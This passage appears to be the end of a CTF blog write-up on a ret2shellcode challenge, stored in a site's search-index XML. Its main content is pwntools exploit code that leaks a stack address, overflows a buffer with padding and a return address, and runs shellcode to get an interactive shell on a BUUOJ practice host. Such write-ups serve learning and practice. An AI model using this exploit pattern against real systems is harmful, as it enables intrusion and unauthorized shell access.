string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25096</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"crash: "</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b"crashme\x00"</span><span class="token operator">+</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x16</span><span class="token operator">-</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>stack_addr<span class="token operator">-</span><span class="token number">0x1c</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcodep<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008200131653.png" alt="image-20231008200131653"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008200154524.png" alt="image-20231008200154524"></p>]]></content>
      
      
      <categories>
          
          <category> ret2shellcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2shellcode </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
